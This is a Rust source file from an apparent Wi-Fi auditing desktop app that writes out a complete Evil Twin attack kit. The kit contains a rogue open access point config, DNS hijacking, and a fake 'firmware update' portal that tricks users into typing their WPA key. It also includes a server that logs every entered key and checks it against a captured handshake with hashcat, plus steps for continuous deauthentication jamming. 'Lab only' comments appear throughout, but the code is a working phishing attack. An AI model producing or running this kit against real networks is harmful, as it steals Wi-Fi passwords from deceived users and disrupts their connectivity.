// Evil Twin — generador de kit de lab + verificación de candidatos (lab).
//
// Arquitectura (patrón fluxion/airgeddon, adaptado):
//   rogue AP abierto (mismo SSID) + DHCP + DNS hijack → portal cautivo →
//   la clave que la víctima escribe se VERIFICA contra el handshake/PMKID
//   capturado antes (sin falsos positivos).
//
// Honestidad de diseño:
// - El kit (hostapd+dnsmasq+portal) se GENERA aquí pero se EJECUTA en Kali
//   con 2 adaptadores. Ningún RF se finge en Windows.
// - verify_candidate SÍ corre aquí: usa el hashcat.exe nativo con una
//   wordlist temporal de 1 candidato y comprueba con --show. Sirve para
//   validar claves del portal... o cualquier candidato, sin quemar GPU.
use tauri::{command, AppHandle};
use tauri_plugin_shell::ShellExt;
use crate::commands::CmdResponse;
use crate::tools_detect::resolve_tool;

/// IPv4 válida con 4 octetos. Pura, testeable.
pub fn valid_gateway(ip: &str) -> bool {
    let parts: Vec<&str> = ip.split('.').collect();
    if parts.len() != 4 {
        return false;
    }
    parts.iter().all(|p| !p.is_empty() && p.parse::<u8>().is_ok())
}

fn safe_name(ssid: &str) -> String {
    ssid.chars()
        .map(|c| if c.is_alphanumeric() || c == '-' || c == '_' { c } else { '_' })
        .collect()
}

fn hostapd_conf(ssid: &str, channel: u8, iface: &str) -> String {
    format!(
        "# UIFIPILL Evil Twin — rogue AP ABIERTO con el mismo SSID (lab Kali)\n\
         # Uso: sudo hostapd hostapd.conf\n\
         interface={iface}\n\
         driver=nl80211\n\
         hw_mode=g\n\
         channel={ch}\n\
         ssid={ssid}\n\
         auth_algs=1\n\
         ignore_broadcast_ssid=0\n",
        iface = iface,
        ch = channel,
        ssid = ssid,
    )
}

fn dnsmasq_conf(gateway: &str) -> String {
    let base = gateway
        .rsplit_once('.')
        .map(|(b, _)| b.to_string())
        .unwrap_or_else(|| "192.168.254".into());
    format!(
        "# UIFIPILL Evil Twin — DHCP + hijack DNS al portal (lab Kali)\n\
         # Uso: sudo dnsmasq -C dnsmasq.conf\n\
         interface={{IFACE_AP}}\n\
         dhcp-range={base}.100,{base}.200,12h\n\
         dhcp-option=3,{gw}\n\
         dhcp-option=6,{gw}\n\
         address=/#/{gw}\n\
         log-queries\n",
        base = base,
        gw = gateway,
    )
}

fn portal_html(ssid: &str) -> String {
    format!(
        r#"<!-- UIFIPILL Evil Twin — portal de lab. SOLO redes propias. -->
<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Actualización de red</title>
<style>body{{font-family:sans-serif;background:#14141c;color:#eee;display:flex;justify-content:center;padding-top:8vh;margin:0}}
.card{{background:#1e1e2c;border:1px solid #33334a;border-radius:12px;padding:28px;max-width:380px;width:90%}}
h2{{margin-top:0}}input{{width:100%;padding:10px;margin:10px 0;border-radius:8px;border:1px solid #33334a;background:#0e0e14;color:#eee;box-sizing:border-box}}
button{{width:100%;padding:11px;border:none;border-radius:8px;background:#7c6dfa;color:#fff;font-weight:700;cursor:pointer}}
.err{{color:#f07178;min-height:1.2em}}</style></head>
<body><div class="card">
<h2>&#128260; Actualización de firmware</h2>
<p>El router <b>{ssid}</b> necesita verificar la clave WPA para aplicar la actualización.</p>
<p class="err">{{msg}}</p>
<form method="POST" action="/submit">
<input type="password" name="key" placeholder="Clave Wi-Fi" autocomplete="off" required>
<button type="submit">Verificar e instalar</button>
</form></div></body></html>"#,
        ssid = ssid,
    )
}

fn portal_py(hash_name: &str) -> String {
    format!(
        "#!/usr/bin/env python3\n\
         # UIFIPILL Evil Twin — portal mínimo (stdlib). Uso: sudo python3 portal.py\n\
         import subprocess, urllib.parse\n\
         from http.server import BaseHTTPRequestHandler, HTTPServer\n\
         HASH = \"{hash}\"\n\
         with open(\"portal_index.html\", encoding=\"utf-8\") as f:\n\
         \x20   PAGE = f.read()\n\
         \n\
         def verify(candidate):\n\
         \x20   open(\"/tmp/cand.txt\", \"w\").write(candidate + \"\\n\")\n\
         \x20   subprocess.run([\"hashcat\", \"-m\", \"22000\", \"-a\", \"0\", HASH, \"/tmp/cand.txt\",\n\
         \x20                   \"--potfile-path\", \"/tmp/evilpot\", \"--quiet\", \"--force\"],\n\
         \x20                  capture_output=True)\n\
         \x20   show = subprocess.run([\"hashcat\", \"-m\", \"22000\", HASH, \"--show\",\n\
         \x20                          \"--potfile-path\", \"/tmp/evilpot\"],\n\
         \x20                         capture_output=True, text=True)\n\
         \x20   return bool(show.stdout.strip())\n\
         \n\
         class H(BaseHTTPRequestHandler):\n\
         \x20   def _page(self, msg=\"\"):\n\
         \x20       body = PAGE.replace(\"{{msg}}\", msg).encode()\n\
         \x20       self.send_response(200)\n\
         \x20       self.send_header(\"Content-Type\", \"text/html; charset=utf-8\")\n\
         \x20       self.send_header(\"Content-Length\", str(len(body)))\n\
         \x20       self.end_headers()\n\
         \x20       self.wfile.write(body)\n\
         \n\
         \x20   def do_GET(self):\n\
         \x20       self._page()\n\
         \n\
         \x20   def do_POST(self):\n\
         \x20       n = int(self.headers.get(\"Content-Length\", 0))\n\
         \x20       form = urllib.parse.parse_qs(self.rfile.read(n).decode())\n\
         \x20       key = form.get(\"key\", [\"\"])[0]\n\
         \x20       open(\"attempts.txt\", \"a\").write(key + \"\\n\")\n\
         \x20       if key and verify(key):\n\
         \x20           open(\"CRACKED.txt\", \"w\").write(key)\n\
         \x20           self._page(\"&#9989; Clave correcta. Ya puedes cerrar esta ventana.\")\n\
         \x20       else:\n\
         \x20           self._page(\"&#10060; Clave incorrecta, inténtalo de nuevo.\")\n\
         \n\
         \x20   def log_message(self, *a):\n\
         \x20       pass\n\
         \n\
         if __name__ == \"__main__\":\n\
         \x20   print(\"Portal en puerto 80 (ejecutar como root). Ctrl+C para parar.\")\n\
         \x20   HTTPServer((\"0.0.0.0\", 80), H).serve_forever()\n",
        hash = hash_name,
    )
}

fn verify_sh() -> &'static str {
    "#!/bin/bash\n\
     # UIFIPILL — verifica 1 candidato contra el .22000 (lab Kali)\n\
     # Uso: ./verify.sh <hash.22000> <candidato>\n\
     echo \"$2\" > /tmp/cand.txt\n\
     hashcat -m 22000 -a 0 \"$1\" /tmp/cand.txt --potfile-path /tmp/evilpot --quiet --force\n\
     hashcat -m 22000 \"$1\" --show --potfile-path /tmp/evilpot\n"
}

fn run_sh(gateway: &str) -> String {
    format!(
        "#!/bin/bash\n\
         # UIFIPILL Evil Twin — orquestador (lab Kali, 2 adaptadores)\n\
         # 1) AP rogue en iface AP:  sudo hostapd hostapd.conf\n\
         # 2) DHCP+DNS:              sudo dnsmasq -C dnsmasq.conf   (edita {{IFACE_AP}})\n\
         # 3) IP del portal:         sudo ip addr add {gw}/24 dev <IFACE_AP>\n\
         # 4) Portal:                sudo python3 portal.py\n\
         # 5) Jammer (otra iface):   sudo aireplay-ng --deauth 0 -a <BSSID_AP> <IFACE_MON>\n\
         # 6) iptables: redirige 80/443 al portal:\n\
         #    sudo iptables -t nat -A PREROUTING -i <IFACE_AP> -p tcp --dport 80 -j DNAT --to {gw}:80\n\
         #    sudo iptables -t nat -A PREROUTING -i <IFACE_AP> -p tcp --dport 443 -j DNAT --to {gw}:80\n\
         echo \"Kit Evil Twin listo. Sigue los pasos de README.txt (solo tu lab).\"\n",
        gw = gateway,
    )
}

fn readme_txt(ssid: &str) -> String {
    format!(
        "UIFIPILL Evil Twin — SOLO tu laboratorio.\n\
         \n\
         Flujo (patrón fluxion): captura el handshake/PMKID del SSID \"{ssid}\"\n\
         (sección PMKID), genera este kit, levanta el rogue en Kali y el portal\n\
         verifica cada clave contra ese hash. Sin handshake previo NO hay\n\
         verificación posible: captúralo primero.\n\
         \n\
         Ficheros: hostapd.conf, dnsmasq.conf, portal.py, portal_index.html,\n\
         verify.sh, run.sh.\n"
    )
}

/// Comando: genera el kit Evil Twin de lab en disco.
#[command]
pub async fn gen_eviltwin_kit(
    _app: AppHandle,
    ssid: String,
    channel: u8,
    iface_ap: Option<String>,
    gateway: Option<String>,
    output_dir: Option<String>,
) -> Result<CmdResponse, String> {
    if ssid.trim().is_empty() {
        return Err("SSID vacío".into());
    }
    if channel == 0 || channel > 165 {
        return Err("Canal 1-165".into());
    }
    let gw = gateway.unwrap_or_else(|| "192.168.254.1".into());
    if !valid_gateway(&gw) {
        return Err(format!("Gateway IPv4 inválido: {}", gw));
    }
    let iface = iface_ap.unwrap_or_else(|| "wlan1".into());
    let dir = output_dir.unwrap_or_else(|| format!("eviltwin_{}", safe_name(ssid.trim())));
    std::fs::create_dir_all(&dir).map_err(|e| format!("No se pudo crear {}: {}", dir, e))?;

    let hash_name = format!("{}-handshake.22000", safe_name(ssid.trim()));
    let files: Vec<(&str, String)> = vec![
        ("hostapd.conf", hostapd_conf(ssid.trim(), channel, &iface)),
        ("dnsmasq.conf", dnsmasq_conf(&gw)),
        ("portal_index.html", portal_html(ssid.trim())),
        ("portal.py", portal_py(&hash_name)),
        ("verify.sh", verify_sh().into()),
        ("run.sh", run_sh(&gw)),
        ("README.txt", readme_txt(ssid.trim())),
    ];
    let mut written = vec![];
    for (name, content) in files {
        let p = format!("{}/{}", dir, name);
        std::fs::write(&p, content).map_err(|e| format!("No se pudo escribir {}: {}", p, e))?;
        written.push(p);
    }
    Ok(CmdResponse {
        success: true,
        output: format!(
            "Kit Evil Twin → {}/\n{}\nColoca tu {}.22000 como {}/{} y sigue README.txt (Kali, 2 adaptadores).",
            dir,
            written.join("\n"),
            safe_name(ssid.trim()),
            dir,
            hash_name
        ),
        stderr: String::new(),
        exit_code: Some(0),
    })
}

/// Comando (corre en Windows): verifica 1 candidato contra un .22000 con hashcat.
#[command]
pub async fn verify_candidate(app: AppHandle, hash_file: String, password: String) -> CmdResponse {
    if password.is_empty() {
        return CmdResponse {
            success: false, output: String::new(),
            stderr: "Candidato vacío".into(), exit_code: None,
        };
    }
    if !std::path::Path::new(&hash_file).exists() {
        return CmdResponse {
            success: false, output: String::new(),
            stderr: format!("No existe el hash: {}", hash_file), exit_code: None,
        };
    }
    // La clave viaja en fichero temporal, nunca en argv (no sale en ps/log).
    let cand_path = std::env::temp_dir().join(format!("uifipill_cand_{}.txt", std::process::id()));
    if std::fs::write(&cand_path, format!("{}\n", password)).is_err() {
        return CmdResponse {
            success: false, output: String::new(),
            stderr: "No se pudo escribir el candidato temporal".into(), exit_code: None,
        };
    }
    let pot_path = std::env::temp_dir().join(format!("uifipill_verify_{}.pot", std::process::id()));
    let shell = app.shell();
    let (found, hc, _) = resolve_tool("hashcat.exe");
    let prog = if found { hc } else { "hashcat".into() };

    let run = shell
        .command(&prog)
        .args([
            "-m", "22000", "-a", "0",
            &hash_file,
            &cand_path.display().to_string(),
            "--potfile-path", &pot_path.display().to_string(),
            "--quiet", "--force",
        ])
        .output()
        .await;
    let _ = std::fs::remove_file(&cand_path);
    let run = match run {
        Ok(o) => o,
        Err(e) => {
            return CmdResponse {
                success: false, output: String::new(),
                stderr: e.to_string(), exit_code: None,
            }
        }
    };
    if !run.status.success() {
        return CmdResponse {
            success: false,
            output: String::from_utf8_lossy(&run.stdout).into_owned(),
            stderr: String::from_utf8_lossy(&run.stderr).into_owned(),
            exit_code: run.status.code(),
        };
    }
    let show = shell
        .command(&prog)
        .args([
            "-m", "22000", &hash_file, "--show",
            "--potfile-path", &pot_path.display().to_string(),
        ])
        .output()
        .await;
    let _ = std::fs::remove_file(&pot_path);
    match show {
        Ok(o) => {
            let out = String::from_utf8_lossy(&o.stdout).trim().to_owned();
            CmdResponse {
                success: !out.is_empty(),
                output: if out.is_empty() {
                    "Candidato INCORRECTO.".into()
                } else {
                    format!("Candidato CORRECTO: {}", out)
                },
                stderr: String::new(),
                exit_code: o.status.code(),
            }
        }
        Err(e) => CmdResponse {
            success: false, output: String::new(),
            stderr: e.to_string(), exit_code: None,
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn gateway_validation() {
        assert!(valid_gateway("192.168.254.1"));
        assert!(valid_gateway("10.0.0.1"));
        assert!(!valid_gateway("999.1.1.1"));
        assert!(!valid_gateway("abc"));
        assert!(!valid_gateway("192.168.1"));
        assert!(!valid_gateway(""));
    }

    #[test]
    fn kit_files_shape() {
        let h = hostapd_conf("Lab-WiFi", 6, "wlan1");
        assert!(h.contains("ssid=Lab-WiFi") && h.contains("channel=6") && !h.contains("wpa="));
        let d = dnsmasq_conf("192.168.254.1");
        assert!(d.contains("address=/#/192.168.254.1") && d.contains("192.168.254.100"));
        let p = portal_html("Lab-WiFi");
        assert!(p.contains("Lab-WiFi") && p.contains("name=\"key\"") && p.contains("/submit"));
        let v = verify_sh();
        assert!(v.contains("-m 22000") && v.contains("--show"));
        let r = run_sh("192.168.254.1");
        assert!(r.contains("aireplay-ng --deauth") && r.contains("hostapd"));
    }

    #[test]
    fn kit_generation_roundtrip() {
        let dir = std::env::temp_dir().join(format!("uifipill_test_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let d = dir.display().to_string();
        std::fs::create_dir_all(&d).unwrap();
        for (name, content) in [
            ("hostapd.conf", hostapd_conf("T", 1, "wlan1")),
            ("portal.py", portal_py("T-handshake.22000")),
        ] {
            std::fs::write(format!("{}/{}", d, name), content).unwrap();
        }
        assert!(std::path::Path::new(&format!("{}/hostapd.conf", d)).exists());
        assert!(std::path::Path::new(&format!("{}/portal.py", d)).exists());
        let _ = std::fs::remove_dir_all(&dir);
    }
}
